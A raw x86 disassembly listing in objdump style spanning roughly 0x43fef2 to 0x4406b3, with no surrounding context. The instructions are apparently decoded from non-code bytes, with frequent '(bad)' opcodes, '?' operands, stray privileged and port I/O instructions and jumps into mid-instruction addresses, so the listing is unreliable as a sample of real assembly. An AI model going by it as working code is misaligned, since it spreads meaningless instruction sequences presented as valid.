  43fef2:	xor    esp,DWORD PTR [esp+ebp*8]
  43fef5:	or     DWORD PTR ds:0xc79a5aaa,eax
  43fefb:	rol    DWORD PTR [esi],0xc2
  43fefe:	push   esi
  43feff:	jecxz  0x43fef9
  43ff01:	fistp  WORD PTR [edi]
  43ff03:	pop    ss
  43ff04:	cmp    BYTE PTR [edx],ch
  43ff06:	outs   dx,BYTE PTR ds:[esi]
  43ff07:	lods   eax,DWORD PTR ds:[esi]
  43ff08:	or     BYTE PTR [edi+0x75e42e],cl
  43ff0e:	fsubr  DWORD PTR [eax]
  43ff10:	mov    esi,0xa3fa01e7
  43ff15:	loop   0x43fea8
  43ff17:	dec    ebp
  43ff18:	mov    dh,0xab
  43ff1a:	xor    BYTE PTR [bx+di],cl
  43ff1d:	into   
  43ff1e:	dec    edi
  43ff1f:	cmp    ebx,eax
  43ff21:	mov    ds:0x370e59d,eax
  43ff26:	mov    dl,0xde
  43ff28:	arpl   WORD PTR [ebx-0x13fdbaa],sp
  43ff2e:	test   al,0x39
  43ff30:	mov    eax,ds:0xa3d1f45
  43ff35:	sti    
  43ff36:	dec    esp
  43ff37:	push   0x33
  43ff39:	add    ah,BYTE PTR [eax-0x71401241]
  43ff3f:	ds pop edx
  43ff41:	adc    dh,BYTE PTR [ebx+eax*1+0x4f]
  43ff45:	push   ebx
  43ff46:	push   eax
  43ff47:	aad    0x15
  43ff49:	mov    bh,0x82
  43ff4b:	xchg   esp,eax
  43ff4c:	test   eax,0x445d1602
  43ff51:	dec    edx
  43ff52:	imul   ah
  43ff54:	(bad)  
  43ff55:	imul   ebx,DWORD PTR [esi+edx*2],0xffffff89
  43ff59:	cmp    edi,DWORD PTR [ebx+eax*2]
  43ff5c:	xor    BYTE PTR [ecx-0x66],bl
  43ff5f:	pop    ebx
  43ff60:	je     0x43ffd4
  43ff62:	aaa    
  43ff63:	cdq    
  43ff64:	mov    ebx,0xb028f39d
  43ff69:	push   edx
  43ff6a:	repz mov ch,0x89
  43ff6d:	push   ebx
  43ff6e:	push   ebp
  43ff6f:	stos   BYTE PTR es:[edi],al
  43ff70:	xchg   esi,eax
  43ff71:	push   cs
  43ff72:	xor    ecx,DWORD PTR [ebx-0x19]
  43ff75:	add    eax,0xe64e705c
  43ff7a:	jbe    0x43ffdc
  43ff7c:	inc    esi
  43ff7d:	int3   
  43ff7e:	sbb    al,0xab
  43ff80:	mov    dh,0xf3
  43ff82:	outs   dx,DWORD PTR ds:[esi]
  43ff83:	pop    esp
  43ff84:	mov    DWORD PTR [edi+esi*4+0x70c33d3f],edi
  43ff8b:	imul   esi,DWORD PTR [ebp+eiz*4+0xe],0xc98fa9d6
  43ff93:	cs data16 or ah,0x55
  43ff98:	mov    bh,0xb0
  43ff9a:	pusha  
  43ff9b:	xchg   ebp,eax
  43ff9c:	bnd jge 0x43fffb
  43ff9f:	mov    DWORD PTR [esi-0x1c],esi
  43ffa2:	cmp    al,0xd4
  43ffa4:	(bad)
  43ffa8:	ret    0x6b60
  43ffab:	jmp    0xf6f7:0xb9b8e610
  43ffb2:	sub    dl,BYTE PTR [esi]
  43ffb4:	scas   eax,DWORD PTR es:[edi]
  43ffb5:	xchg   ebx,eax
  43ffb6:	call   0xa14312f3
  43ffbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ffbc:	add    al,BYTE PTR [edx]
  43ffbe:	push   es
  43ffbf:	test   DWORD PTR [edi+0xf72baca],edx
  43ffc5:	push   0xd79ad6c
  43ffca:	or     dl,al
  43ffcc:	imul   ebx,DWORD PTR [edi-0x3aa6bf96],0x1e
  43ffd3:	aas    
  43ffd4:	inc    esp
  43ffd5:	stos   DWORD PTR es:[edi],eax
  43ffd6:	sub    DWORD PTR [eax],edi
  43ffd8:	adc    eax,DWORD PTR [ebx]
  43ffda:	and    DWORD PTR [ebp+eiz*2+0x22916009],esi
  43ffe1:	pusha  
  43ffe2:	popf   
  43ffe3:	mov    ?,esi
  43ffe5:	push   ebx
  43ffe6:	adc    esp,edx
  43ffe8:	xchg   esi,eax
  43ffe9:	(bad)  [ecx]
  43ffeb:	jmp    0xaf88:0x106fb5a5
  43fff2:	or     bh,bl
  43fff4:	and    DWORD PTR [ebx+0x7226e13d],0xec884ac2
  43fffe:	pop    esi
  43ffff:	sub    dl,BYTE PTR [esi-0x76ef2770]
  440005:	pop    edi
  440006:	xchg   esi,eax
  440007:	ret    0x9c13
  44000a:	int3   
  44000b:	jmp    FWORD PTR [ebx-0x65114ffb]
  440011:	xor    bl,BYTE PTR [ecx]
  440013:	stc    
  440014:	push   ss
  440015:	and    ebx,DWORD PTR [edi]
  440017:	fbld   TBYTE PTR gs:[esi-0x41]
  44001b:	cld    
  44001c:	pop    edx
  44001d:	mov    ds:0x63d8d4f5,eax
  440022:	mov    es,esi
  440024:	sbb    eax,DWORD PTR [edx+0x39f68126]
  44002a:	dec    esi
  44002b:	mov    ebx,0x5486d939
  440030:	ror    BYTE PTR [edx+0x2a57e06],0x5a
  440037:	sbb    ebx,ebp
  440039:	int    0x84
  44003b:	fidivr WORD PTR [esi+0x24b55e93]
  440041:	call   0x6e1:0x1b93e09f
  440048:	les    eax,FWORD PTR ds:0x158b603e
  44004e:	jmp    0x20169709
  440053:	imul   esp,DWORD PTR [esi-0x41],0x71
  440057:	jbe    0x4400b5
  440059:	and    ah,bh
  44005b:	aam    0xe2
  44005d:	(bad)  
  44005e:	jo     0x440051
  440060:	dec    ecx
  440061:	xchg   esi,eax
  440062:	call   0xa8718976
  440067:	cld    
  440068:	aas    
  440069:	dec    ecx
  44006a:	es jb  0x44003b
  44006d:	jno    0x44007d
  44006f:	stc    
  440070:	mov    BYTE PTR [esi+0x71],dl
  440073:	sub    ebx,0xffffffb8
  440076:	mov    ds:0x34e588e0,al
  44007b:	adc    ebx,ebx
  44007d:	das    
  44007e:	xchg   ecx,eax
  44007f:	lods   al,BYTE PTR ds:[esi]
  440080:	stos   BYTE PTR es:[edi],al
  440081:	add    eax,0xe8980d04
  440086:	ins    DWORD PTR es:[edi],dx
  440087:	inc    ebp
  440088:	or     DWORD PTR [esi+0x1f],ecx
  44008b:	dec    ebx
  44008c:	pop    edi
  44008d:	xlat   BYTE PTR ds:[ebx]
  44008e:	stos   BYTE PTR es:[edi],al
  44008f:	inc    esi
  440090:	xchg   esi,eax
  440091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440092:	sub    ah,dl
  440094:	cmp    eax,DWORD PTR [eax+0x5113f7f2]
  44009a:	inc    eax
  44009b:	inc    esp
  44009c:	cld    
  44009d:	mov    ecx,0x5788f20b
  4400a2:	xor    al,0x6a
  4400a4:	rol    BYTE PTR [ebx+0x57],0x60
  4400a8:	js     0x4400ad
  4400aa:	fiadd  DWORD PTR [edi-0x6ebad050]
  4400b0:	dec    eax
  4400b1:	mov    edi,0x21ddff60
  4400b6:	daa    
  4400b7:	cli    
  4400b8:	jmp    0xeb23:0x9d9eb588
  4400bf:	push   esp
  4400c0:	add    eax,0xbc37b692
  4400c5:	rcl    DWORD PTR [ecx-0x7ffe4ceb],1
  4400cb:	push   cs
  4400cc:	ds pop eax
  4400ce:	sbb    al,0x14
  4400d0:	(bad)  
  4400d1:	push   cs
  4400d2:	cmp    eax,0xf33e71d4
  4400d7:	inc    ebp
  4400d8:	mov    edx,0x89e3e827
  4400dd:	(bad)  
  4400de:	pop    edx
  4400df:	imul   ebp,DWORD PTR [esi-0x408087f4],0xb40e7c14
  4400e9:	or     ebp,DWORD PTR [edx+0x54]
  4400ec:	mov    al,ds:0x89124a51
  4400f1:	xchg   ecx,eax
  4400f2:	xchg   edx,eax
  4400f3:	cli    
  4400f4:	xor    DWORD PTR [edi+0x2eb7e80],edx
  4400fa:	into   
  4400fb:	xchg   ebp,eax
  4400fc:	xchg   esp,eax
  4400fd:	lods   al,BYTE PTR ds:[esi]
  4400fe:	sahf   
  4400ff:	and    bl,0xe1
  440102:	pop    ds
  440103:	test   DWORD PTR [ecx+0xce51a34],ebx
  440109:	in     al,0x22
  44010b:	aam    0xaf
  44010d:	fs mov esi,0xad5bc2b9
  440113:	xchg   edx,eax
  440114:	mov    ch,dl
  440116:	mov    bl,dh
  440118:	shr    cl,0xd1
  44011b:	es aad 0x55
  44011e:	ret    0x6226
  440121:	jecxz  0x4400f9
  440123:	aad    0x66
  440125:	inc    eax
  440126:	mov    cl,0x0
  440128:	or     DWORD PTR [edx-0x6c762363],edi
  44012e:	scas   al,BYTE PTR es:[edi]
  44012f:	fwait
  440130:	daa    
  440131:	cmp    edi,ebx
  440133:	or     DWORD PTR [eax+0x12e61202],ebx
  440139:	mov    fs,eax
  44013b:	test   ecx,ecx
  44013d:	(bad)  [esi-0x6f]
  440140:	xchg   ebx,eax
  440141:	mov    DWORD PTR [eax+0x2b63013c],ebx
  440147:	jns    0x440170
  440149:	add    ebp,DWORD PTR [ebx+ebx*8-0x1c]
  44014d:	ret    
  44014e:	dec    ecx
  44014f:	iret   
  440150:	xor    eax,0x96ef1e41
  440155:	int    0x47
  440157:	push   ebx
  440158:	in     al,0x22
  44015a:	dec    ebp
  44015b:	aam    0xe6
  44015d:	imul   DWORD PTR [ebx-0x67]
  440160:	(bad)  
  440161:	int3   
  440162:	add    al,0x68
  440164:	mov    bh,dl
  440166:	sbb    edi,DWORD PTR [ebx+0x2bf7c46f]
  44016c:	cmp    BYTE PTR [edx],al
  44016e:	push   cs
  44016f:	(bad)  
  440170:	mov    bh,0x52
  440172:	xor    eax,0x1fa0f4fd
  440177:	jmp    0x23bc5409
  44017c:	adc    al,0x66
  44017e:	fcmovnbe st,st(4)
  440180:	in     eax,dx
  440181:	jbe    0x4401c0
  440183:	and    al,0xc6
  440185:	jb     0x4401ce
  440187:	repz jmp DWORD PTR [ecx]
  44018a:	push   edx
  44018b:	ficomp WORD PTR [edx+0x2ca3f663]
  440191:	enter  0x865f,0xc3
  440195:	pop    eax
  440196:	mov    dh,0x54
  440198:	mov    DWORD PTR [edi],ebx
  44019a:	xchg   ecx,eax
  44019b:	xchg   DWORD PTR [eax],esp
  44019d:	pop    ds
  44019e:	sar    DWORD PTR [di],0x2
  4401a2:	pop    esi
  4401a3:	xlat   BYTE PTR ds:[ebx]
  4401a4:	jmp    0x9176:0xa69a0017
  4401ab:	cdq    
  4401ac:	jmp    0x5799:0x55d45488
  4401b3:	inc    esi
  4401b4:	mov    bh,0xe2
  4401b6:	xchg   dl,bl
  4401b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401b9:	add    al,BYTE PTR [edx+0x28f9d320]
  4401bf:	fnstcw WORD PTR [ebx-0x6a]
  4401c2:	pusha  
  4401c3:	dec    ecx
  4401c4:	xor    al,0x88
  4401c6:	push   ds
  4401c7:	icebp  
  4401c8:	loopne 0x4401b4
  4401ca:	push   ss
  4401cb:	mov    ebx,0x85c81bf4
  4401d0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401d2:	push   esi
  4401d3:	pop    ebp
  4401d4:	push   esi
  4401d5:	push   es
  4401d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4401d7:	jle    0x440206
  4401d9:	jle    0x4401ea
  4401db:	std    
  4401dc:	push   cs
  4401dd:	(bad)  
  4401de:	pop    ds
  4401df:	sbb    eax,0xb06e5f6
  4401e4:	ret    
  4401e5:	xchg   ecx,eax
  4401e6:	cmp    eax,DWORD PTR [ebx-0x52]
  4401e9:	jno    0x440181
  4401eb:	dec    ebp
  4401ec:	mov    BYTE PTR [ebx-0x17681616],al
  4401f2:	adc    ah,ah
  4401f4:	std    
  4401f5:	add    ebp,DWORD PTR [esi+0x5d]
  4401f8:	fiadd  DWORD PTR [edx]
  4401fa:	fldenv [edx]
  4401fc:	dec    ecx
  4401fd:	mov    esi,0x303225d
  440202:	sahf   
  440203:	jno    0x44025c
  440205:	sub    edx,DWORD PTR [edx-0x71]
  440208:	xchg   edx,eax
  440209:	push   edx
  44020a:	pop    ds
  44020b:	icebp  
  44020c:	ret    
  44020d:	cs push eax
  44020f:	add    al,0xc
  440211:	sar    DWORD PTR [eax],cl
  440213:	lahf   
  440214:	loop   0x440276
  440216:	xor    bh,dl
  440218:	xor    bl,BYTE PTR [ecx-0x662e7901]
  44021e:	pusha  
  44021f:	popa   
  440220:	adc    al,0xfc
  440222:	in     eax,0xe0
  440224:	add    al,0xea
  440226:	lods   al,BYTE PTR ds:[esi]
  440227:	aad    0x56
  440229:	popf   
  44022a:	sub    ebx,0x31
  44022d:	(bad)  
  44022e:	(bad)  
  44022f:	mov    esi,0x5d1b1d89
  440234:	inc    esp
  440235:	sbb    eax,0x3325c0f
  44023a:	push   ss
  44023b:	(bad)  
  44023c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  44023e:	mov    al,ch
  440240:	clc    
  440241:	mov    al,ds:0x2853256e
  440246:	sar    BYTE PTR [eax],1
  440248:	leave  
  440249:	sti    
  44024a:	or     eax,0xa802a826
  44024f:	enter  0x32d8,0x86
  440253:	dec    edi
  440254:	iret   
  440255:	push   edx
  440256:	pop    esp
  440257:	push   ebp
  440258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440259:	dec    ebp
  44025a:	(bad)  
  44025c:	mov    esi,ecx
  44025e:	lea    eax,[ebx-0x4af8e4ba]
  440264:	inc    edx
  440265:	mov    edx,0x1ca4510a
  44026a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44026b:	jp     0x4402eb
  44026d:	sub    DWORD PTR cs:[edx],0x5d70db58
  440274:	mov    DWORD PTR [ecx-0x790b942b],eax
  44027a:	repz jecxz 0x440226
  44027d:	add    DWORD PTR [edx+0x6c],edx
  440280:	jmp    0x4402a3
  440282:	or     al,0xe0
  440284:	mov    BYTE PTR [esi-0x2a56562],dl
  44028a:	bound  esp,QWORD PTR [ecx]
  44028c:	out    0x1a,al
  44028e:	push   ds
  44028f:	adc    ch,BYTE PTR [edx-0x6f]
  440292:	fbld   TBYTE PTR [eax+0x25]
  440295:	sbb    al,0x66
  440297:	pushf  
  440298:	je     0x4402ed
  44029a:	out    dx,al
  44029b:	xchg   esi,eax
  44029c:	or     BYTE PTR [edi],ah
  44029e:	cli    
  44029f:	loop   0x440229
  4402a1:	and    DWORD PTR [ebx-0x71],eax
  4402a4:	xchg   esp,eax
  4402a5:	push   0xfbb1f054
  4402aa:	pop    ecx
  4402ab:	pop    edi
  4402ac:	mov    bh,0x1f
  4402ae:	jp     0x440251
  4402b0:	cmp    edi,DWORD PTR [esi-0x14]
  4402b3:	inc    ebx
  4402b4:	sbb    edx,eax
  4402b6:	jle    0x44025f
  4402b8:	and    al,0x0
  4402ba:	pop    ds
  4402bb:	mov    bh,0x1b
  4402bd:	int    0xd6
  4402bf:	(bad)  
  4402c0:	(bad)  
  4402c1:	or     ebx,esi
  4402c3:	aam    0xed
  4402c5:	jnp    0x44029d
  4402c7:	inc    ecx
  4402c8:	pop    esp
  4402c9:	xchg   esi,eax
  4402ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4402cb:	inc    edx
  4402cc:	imul   ebx,esp,0x6a
  4402cf:	(bad)  
  4402d1:	push   0x8f06b30f
  4402d6:	loop   0x440258
  4402d8:	loope  0x4402ae
  4402da:	adc    DWORD PTR [ebp+0x10],0xfad706b
  4402e1:	test   eax,0x94283681
  4402e6:	aam    0x75
  4402e8:	ja     0x44034d
  4402ea:	stos   DWORD PTR es:[edi],eax
  4402eb:	dec    eax
  4402ec:	rcr    DWORD PTR fs:[edi],0xe1
  4402f0:	popf   
  4402f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4402f2:	jp     0x440314
  4402f4:	adc    al,0xc
  4402f6:	cwde   
  4402f7:	aam    0xdc
  4402f9:	aad    0xdd
  4402fb:	repz push es
  4402fd:	repz sbb ah,bh
  440300:	mov    bh,0xa5
  440302:	ins    BYTE PTR es:[edi],dx
  440303:	sub    BYTE PTR [ecx],dh
  440305:	mov    bl,0xe1
  440307:	jge    0x440302
  440309:	lds    edx,FWORD PTR cs:[ebx-0x2a2ab3b8]
  440310:	inc    eax
  440311:	mov    ah,0x89
  440313:	adc    BYTE PTR [esp+esi*1-0x6c],cl
  440317:	cwde   
  440318:	mov    BYTE PTR [ebx],al
  44031a:	ret    
  44031b:	fcom   QWORD PTR gs:[edi+0x3080750]
  440322:	sbb    al,BYTE PTR [ebp+ebx*4-0x17]
  440326:	mov    ch,ah
  440328:	push   cs
  440329:	sub    ah,BYTE PTR [edi+esi*2-0x2e]
  44032d:	scas   al,BYTE PTR es:[edi]
  44032e:	sub    DWORD PTR [eax],eax
  440330:	ret    0xb325
  440333:	repz (bad) 
  440335:	add    al,BYTE PTR [edx]
  440337:	fcomp  DWORD PTR [edi]
  440339:	std    
  44033a:	aas    
  44033b:	(bad)  
  44033c:	shr    ecx,1
  44033e:	pop    ds
  44033f:	daa    
  440340:	adc    esp,0xffffff83
  440343:	and    eax,0xd46c384e
  440348:	jns    0x440344
  44034a:	or     al,0x90
  44034c:	aaa    
  44034d:	lods   eax,DWORD PTR ds:[esi]
  44034e:	jo     0x4403a7
  440350:	dec    edi
  440352:	imul   edx,esp,0xffffffd2
  440355:	xchg   edi,eax
  440356:	imul   esi,DWORD PTR [ebx+0x8],0x30
  44035a:	push   ebx
  44035b:	aam    0x2b
  44035d:	je     0x440355
  44035f:	dec    DWORD PTR [ecx-0x8e249fc]
  440365:	pop    ecx
  440366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440367:	ror    BYTE PTR [edx+0x43],1
  44036a:	sahf   
  44036b:	jge    0x44036d
  44036d:	ret    
  44036e:	and    bh,BYTE PTR [ecx+ebp*4]
  440371:	add    ch,BYTE PTR [esi+0x11]
  440374:	cmp    al,0xe1
  440376:	retf   0x7969
  440379:	inc    ebx
  44037a:	or     DWORD PTR [esi+esi*4-0x76a53e0f],ebp
  440381:	cmc    
  440382:	ja     0x440368
  440384:	add    bh,BYTE PTR [esi+0x2000b356]
  44038a:	dec    edi
  44038b:	aam    0x15
  44038d:	cmp    eax,0x9329d879
  440392:	pop    ds
  440393:	mov    ecx,0x55fdde63
  440398:	in     al,0xeb
  44039a:	pusha  
  44039b:	aam    0x60
  44039d:	xchg   esp,eax
  44039e:	popa   
  44039f:	push   ebp
  4403a0:	pop    ebp
  4403a1:	sbb    edi,ebx
  4403a3:	outs   dx,BYTE PTR ds:[esi]
  4403a4:	jp     0x44040a
  4403a6:	push   ds
  4403a7:	adc    eax,0xecf4d5d1
  4403ac:	jmp    0xa8e:0xa8d574cc
  4403b3:	add    esp,ebx
  4403b5:	test   eax,0xb7893310
  4403ba:	repz lea esi,[eax+0x44]
  4403be:	cld    
  4403bf:	push   ss
  4403c0:	loopne 0x4403c7
  4403c2:	mov    esp,?
  4403c4:	add    eax,0xc43d9157
  4403c9:	fwait
  4403ca:	pop    ds
  4403cb:	xchg   edi,eax
  4403cc:	(bad)  
  4403cd:	mov    es,WORD PTR [edi-0x1997c7f4]
  4403d3:	aad    0xf2
  4403d5:	inc    edi
  4403d6:	test   BYTE PTR [ecx-0x127e9250],dl
  4403dc:	imul   BYTE PTR [ebx+0x2907b892]
  4403e2:	je     0x4403de
  4403e4:	test   DWORD PTR [ebp+0x1c],0x13d74c6b
  4403eb:	xlat   BYTE PTR ds:[ebx]
  4403ec:	inc    ebx
  4403ed:	dec    edx
  4403ee:	pop    es
  4403ef:	push   ecx
  4403f0:	push   cs
  4403f1:	sbb    eax,0x618815b2
  4403f6:	jmp    0x44038b
  4403f8:	leave  
  4403f9:	cmp    cl,BYTE PTR [esi-0x42]
  4403fc:	adc    al,BYTE PTR [edx]
  4403fe:	ror    BYTE PTR [ebx+0xd],1
  440401:	or     al,0x82
  440403:	inc    edx
  440404:	xchg   edx,eax
  440405:	or     esi,DWORD PTR [edi+ebp*2]
  440408:	push   0x9621950f
  44040d:	mov    ch,0xa6
  44040f:	aam    0xda
  440411:	sub    eax,0x6234319a
  440416:	dec    edx
  440417:	mov    edx,0x883b24f6
  44041c:	enter  0x816c,0xe8
  440420:	data16 daa 
  440422:	es cdq 
  440424:	mov    BYTE PTR [ebx+0x21682dfb],cl
  44042a:	adc    eax,0x9784f8fd
  44042f:	jmp    0x4403ba
  440431:	dec    esi
  440432:	push   eax
  440433:	sbb    al,bl
  440435:	daa    
  440436:	popa   
  440437:	imul   ecx,DWORD PTR [esi+0x14b4a0cb],0xffffffe7
  44043e:	mov    esp,DWORD PTR [esp+eiz*4]
  440441:	fwait
  440442:	scas   eax,DWORD PTR es:[edi]
  440443:	aad    0x80
  440445:	cdq    
  440446:	adc    ecx,ebp
  440448:	sbb    eax,0xb22a39ee
  44044d:	(bad)  
  44044e:	mov    edi,0xcf6408b1
  440453:	add    BYTE PTR [ebp+esi*2+0x5b5fd738],dh
  44045a:	call   0x9514d505
  44045f:	xchg   ebp,eax
  440460:	stc    
  440461:	daa    
  440462:	sub    edi,edx
  440464:	jecxz  0x44042c
  440466:	mov    DWORD PTR [edi+0x58166a4d],eax
  44046c:	jae    0x440459
  44046e:	pusha  
  44046f:	add    DWORD PTR [edx+ebp*8],ebp
  440472:	loope  0x4404d2
  440474:	and    DWORD PTR [ebp+0x290c471f],esi
  44047a:	cmp    BYTE PTR [ecx+0x6ce91c07],0xa8
  440481:	jp     0x4404c1
  440483:	sar    ecx,cl
  440485:	arpl   WORD PTR [eax],sp
  440487:	dec    ebx
  440488:	or     bl,bh
  44048a:	jle    0x440509
  44048c:	mov    cs,WORD PTR [edi+0x3c]
  44048f:	stc    
  440490:	fcomp  DWORD PTR [esi]
  440492:	div    DWORD PTR [ebp-0x4]
  440495:	repz jno 0x440442
  440498:	cld    
  440499:	pop    edx
  44049a:	int    0xec
  44049c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44049d:	test   DWORD PTR [esi+0x73],eax
  4404a0:	cdq    
  4404a1:	in     al,dx
  4404a2:	pusha  
  4404a3:	pop    es
  4404a4:	jmp    0x4404aa
  4404a6:	cmp    cl,cl
  4404a8:	ins    DWORD PTR es:[edi],dx
  4404a9:	xor    DWORD PTR [edi+0x13],edi
  4404ac:	push   cs
  4404ad:	imul   eax,DWORD PTR [esi+0x662c91b],0xffffffbe
  4404b4:	mov    DWORD PTR [ebx-0x58f834dd],esi
  4404ba:	push   edi
  4404bb:	add    dh,al
  4404bd:	sbb    esp,esp
  4404bf:	add    al,0xbc
  4404c1:	call   0x6ce4dc21
  4404c6:	inc    edi
  4404c7:	jb     0x44049b
  4404c9:	inc    edx
  4404ca:	adc    al,0xb
  4404cc:	xchg   esi,eax
  4404cd:	sub    ebp,ebx
  4404cf:	push   ebx
  4404d0:	gs inc ebx
  4404d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4404d3:	xchg   edx,eax
  4404d4:	outs   dx,DWORD PTR ds:[esi]
  4404d5:	test   eax,0x9e3d1c27
  4404da:	pop    ecx
  4404db:	mov    edi,0xe9af82cb
  4404e0:	loope  0x4404f7
  4404e2:	mov    bh,0xcd
  4404e4:	mov    DWORD PTR ds:0x4a62bc23,edi
  4404ea:	cmp    eax,0x1c02156c
  4404ef:	sar    ecx,1
  4404f1:	ffreep st(5)
  4404f3:	shl    DWORD PTR [ecx],0x88
  4404f6:	(bad)  
  4404f7:	imul   edx,ecx,0x5
  4404fa:	mov    ebx,ecx
  4404fc:	mov    esp,0x642ef93
  440501:	add    dl,al
  440503:	adc    BYTE PTR [eax-0x2cbe8a38],bh
  440509:	loope  0x44056b
  44050b:	add    eax,0xbdb5b084
  440510:	jecxz  0x440565
  440512:	adc    ebp,DWORD PTR [edi-0x44]
  440515:	and    BYTE PTR [ecx+0x1f3d1eb9],bh
  44051b:	stos   BYTE PTR es:[edi],al
  44051c:	cs mov dh,0xaf
  44051f:	xchg   DWORD PTR [ebx-0x49c4f197],ebx
  440525:	add    ch,BYTE PTR [edx]
  440527:	retf   0xb7a4
  44052a:	mov    bh,0xd3
  44052c:	mov    ebp,DWORD PTR [esi]
  44052e:	fcomp  DWORD PTR [ecx+0x24d0465e]
  440534:	mov    al,0xe5
  440536:	mov    cl,0xa8
  440538:	mov    ebp,eax
  44053a:	dec    edx
  44053b:	adc    DWORD PTR [ebp+0x3f5b9a33],ebp
  440541:	and    al,0xbc
  440543:	repnz rcr DWORD PTR [eax+0x61],1
  440547:	mov    ds:0x1d857f5a,eax
  44054c:	push   ds
  44054d:	mov    al,0x1f
  44054f:	dec    edi
  440550:	mov    ah,0x93
  440552:	xor    al,0x44
  440554:	jle    0x440574
  440556:	cmp    al,0xd6
  440558:	in     eax,0x89
  44055a:	stos   BYTE PTR es:[edi],al
  44055b:	mov    esi,0xc5831b8e
  440560:	jp     0x4404f6
  440562:	pop    ds
  440563:	(bad)  [edx+0x14]
  440566:	call   0x28046791
  44056b:	aam    0xd
  44056d:	and    al,BYTE PTR [ebp+0x7df61458]
  440573:	add    ecx,DWORD PTR [eax+0x36d8485d]
  440579:	es jmp 0x440596
  44057c:	sub    BYTE PTR [ebx],al
  44057e:	stos   BYTE PTR es:[edi],al
  44057f:	jecxz  0x440569
  440581:	mov    al,ds:0x9e446b07
  440586:	cdq    
  440587:	mov    ebx,0x1190219
  44058c:	mov    ecx,0x4893951d
  440591:	arpl   WORD PTR ds:0x776d6dd7,di
  440597:	xchg   al,ah
  440599:	cmp    al,BYTE PTR [ebp-0x7d4a7615]
  44059f:	sbb    eax,DWORD PTR [ecx-0x6e]
  4405a2:	pop    ss
  4405a3:	sti    
  4405a4:	mov    eax,DWORD PTR ds:0xcf0523e2
  4405aa:	fwait
  4405ab:	pusha  
  4405ac:	xor    bh,dh
  4405ae:	adc    al,0x88
  4405b0:	pop    eax
  4405b1:	in     eax,0x60
  4405b3:	sbb    edx,DWORD PTR [eax-0x3d]
  4405b6:	cwde   
  4405b7:	sub    eax,0x5e4d5803
  4405bc:	inc    edi
  4405bd:	test   BYTE PTR [ebp+0x2b],0xff
  4405c1:	daa    
  4405c2:	ins    BYTE PTR es:[edi],dx
  4405c3:	je     0x4405d9
  4405c5:	test   al,0x1f
  4405c7:	stos   BYTE PTR es:[edi],al
  4405c8:	mov    edx,0x8aeedb38
  4405cd:	out    0x4d,eax
  4405cf:	(bad)  
  4405d0:	into   
  4405d1:	loopne 0x440562
  4405d3:	in     al,dx
  4405d4:	enter  0x2227,0xb5
  4405d8:	jo     0x440573
  4405da:	fimul  WORD PTR [edx+0x9]
  4405dd:	dec    edx
  4405de:	lds    esi,FWORD PTR [ebp+0x500caeb6]
  4405e4:	mov    BYTE PTR [ebx],cl
  4405e6:	fwait
  4405e7:	mov    cl,BYTE PTR [edi+0x7d6938ac]
  4405ed:	add    bl,BYTE PTR [esi-0x10268c37]
  4405f3:	or     BYTE PTR [eax-0x80],0x6d
  4405f7:	cmc    
  4405f8:	lods   eax,DWORD PTR ds:[esi]
  4405f9:	push   esi
  4405fa:	cwde   
  4405fb:	jp     0x4405c5
  4405fd:	push   es
  4405fe:	loope  0x440660
  440600:	sbb    al,0x2
  440602:	push   cs
  440603:	out    0x45,al
  440605:	je     0x4405f6
  440607:	jne    0x440670
  440609:	xchg   edi,eax
  44060a:	pop    ds
  44060b:	pop    ebp
  44060c:	jns    0x44065b
  44060e:	sub    al,0xe3
  440610:	push   ss
  440611:	clc    
  440612:	iret   
  440613:	lock xor al,0x63
  440616:	jge    0x4405e9
  440618:	jl     0x4405e6
  44061a:	ss push edi
  44061c:	cmp    DWORD PTR [eiz*1-0x1816f638],esp
  440623:	cld    
  440624:	mov    DWORD PTR [ebp+0x76],ecx
  440627:	mov    DWORD PTR [edx-0x43998865],esp
  44062d:	bound  eax,QWORD PTR [ecx+0x613ad09f]
  440633:	xlat   BYTE PTR ds:[ebx]
  440634:	sub    al,0x80
  440636:	mov    bh,0x2b
  440638:	inc    ecx
  440639:	fisubr DWORD PTR [esi-0x71ca7936]
  44063f:	jae    0x440637
  440641:	outs   dx,DWORD PTR ds:[esi]
  440642:	mov    edi,0x22d7cb41
  440647:	repz rol DWORD PTR [edx],0xc6
  44064b:	cmp    cl,bh
  44064d:	lea    eax,[edx]
  44064f:	js     0x440646
  440651:	js     0x4406bf
  440653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440654:	fcmovnb st,st(2)
  440656:	stos   BYTE PTR es:[edi],al
  440657:	sub    DWORD PTR [eax-0x7b91914d],0x1a
  44065e:	rcr    BYTE PTR [ebp+0x69],0xa1
  440662:	es aam 0xe5
  440665:	popa   
  440666:	mov    ecx,0x51118925
  44066b:	cmp    eax,0xb41c4f84
  440670:	dec    ebp
  440671:	add    eax,DWORD PTR [eax]
  440673:	loopne 0x440678
  440675:	out    0x1e,al
  440677:	mov    ebp,0xcb1f7a0a
  44067c:	pop    esi
  44067d:	cwde   
  44067e:	je     0x440671
  440680:	cmp    BYTE PTR [ecx],bh
  440682:	jno    0x440658
  440684:	add    BYTE PTR [eax+0x13229cbe],ch
  44068a:	mov    ds:0x5d2d8823,eax
  44068f:	or     al,0x5b
  440691:	xor    BYTE PTR [ebx],ch
  440693:	cmp    DWORD PTR [ebx-0x346609fb],eax
  440699:	(bad)  
  44069a:	imul   esp,DWORD PTR [ecx],0x37
  44069d:	adc    al,0x13
  44069f:	pop    ds
  4406a0:	mov    bh,0x47
  4406a2:	stos   DWORD PTR es:[edi],eax
  4406a3:	mov    eax,ds:0xaa66bc16
  4406a8:	dec    edi
  4406a9:	push   cs
  4406aa:	lahf   
  4406ab:	push   edx
  4406ac:	sub    DWORD PTR [ebp+0x35eda60],esp
  4406b2:	pop    edx
  4406b3:	inc    edx
